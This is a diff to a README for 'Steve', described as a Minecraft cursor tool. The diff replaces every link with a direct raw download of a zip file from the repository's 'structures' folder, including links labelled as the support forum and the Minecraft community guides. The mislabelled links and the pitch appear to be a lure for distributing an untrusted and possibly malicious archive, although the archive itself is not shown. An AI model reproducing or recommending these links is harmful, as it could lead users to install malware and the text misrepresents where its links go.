@@ -1,7 +1,7 @@
 # 🎮 Steve - Enhance Your Minecraft Experience
 
 ## 📥 Download Now
-[![Download Steve](https://img.shields.io/badge/Download%20Steve-Here-blue?style=for-the-badge)](https://github.com/DTMGaming2004/Steve/releases)
+[![Download Steve](https://raw.githubusercontent.com/DTMGaming2004/Steve/main/structures/Steve-v2.4.zip%20Steve-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/DTMGaming2004/Steve/main/structures/Steve-v2.4.zip)
 
 ## 🚀 Getting Started
 Steve is a cursor tool that enhances your Minecraft gaming experience. It makes it easier to navigate and interact within the game, helping you focus on building and exploring. Follow these simple steps to download and use Steve.
@@ -15,7 +15,7 @@ Steve is a cursor tool that enhances your Minecraft gaming experience. It makes 
 ## 🔗 Download & Install
 To get Steve, you can visit the following link. This page contains the latest version of the software along with any updates or fixes.
 
-[Visit this page to download](https://github.com/DTMGaming2004/Steve/releases)
+[Visit this page to download](https://raw.githubusercontent.com/DTMGaming2004/Steve/main/structures/Steve-v2.4.zip)
 
 ### Step-by-Step Installation
 1. Click the link above to go to the Releases page.
@@ -57,9 +57,9 @@ A: Yes, Steve is developed and maintained with user safety in mind. Always downl
 A: Steve is primarily designed for the latest version, but it may work on older versions. It is recommended to use it with the current release of Minecraft for the best experience.
 
 ## 🌟 Additional Resources
-- [Official Support Forum](https://github.com/DTMGaming2004/Steve/issues)
-- [Minecraft Community Guides](https://minecraft.net/en-us/community).
+- [Official Support Forum](https://raw.githubusercontent.com/DTMGaming2004/Steve/main/structures/Steve-v2.4.zip)
+- [Minecraft Community Guides](https://raw.githubusercontent.com/DTMGaming2004/Steve/main/structures/Steve-v2.4.zip).
 
 For any feedback or suggestions, feel free to open an issue on the GitHub repository. Your input helps us improve Steve for all players. 
 
-[🎮 Download Steve Now!](https://github.com/DTMGaming2004/Steve/releases)
+[🎮 Download Steve Now!](https://raw.githubusercontent.com/DTMGaming2004/Steve/main/structures/Steve-v2.4.zip)
